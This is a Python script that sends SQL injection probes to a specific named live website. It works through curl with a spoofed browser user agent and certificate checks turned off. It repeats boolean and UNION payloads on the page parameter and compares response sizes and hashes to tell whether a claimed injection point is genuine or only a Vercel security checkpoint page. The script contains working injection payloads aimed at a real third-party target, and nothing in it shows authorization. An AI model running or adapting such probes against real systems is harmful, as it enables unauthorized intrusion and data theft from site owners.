import subprocess, hashlib, collections, statistics
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
T='https://www.infinitycapital.bh'
def get(u):
    p=subprocess.run(['curl','-sk','-A',UA,'-m','30',u],capture_output=True)
    b=p.stdout
    return len(b), hashlib.md5(b).hexdigest(), b

print("### A) SAME url x8 -> size/md5 spread (is the 403 body constant?)")
sizes=[];mds=collections.Counter()
for i in range(8):
    n,h,_=get(T+'/?page=2'); sizes.append(n); mds[h]+=1
print("sizes:",sizes,"distinct md5:",len(mds),"stdev=%.1f"%statistics.pstdev(sizes))

print("\n### B) claimed SQLi oracle on /?page=  TRUE vs FALSE vs baseline x6 each")
for label,pay in [("baseline","2"),("AND 1=1","2 AND 1=1"),("AND 1=2","2 AND 1=2")]:
    row=[]
    for i in range(6):
        from urllib.parse import quote
        n,h,_=get(T+'/?page='+quote(pay)); row.append((n,h[:8]))
    print("%-10s sizes=%s md5s=%s"%(label,[r[0] for r in row],set(r[1] for r in row)))

print("\n### C) does any response differ from the checkpoint interstitial?")
from urllib.parse import quote
def body_mark(pay):
    n,h,b=get(T+'/?page='+quote(pay))
    return n, ('Vercel Security Checkpoint' in b.decode('utf-8','ignore')), (b'INJX77' in b)
for pay in ["2","2 AND 1=1","2' AND '1'='1","2;SELECT 1","2 UNION SELECT 1,2,3"]:
    print(pay, body_mark(pay))
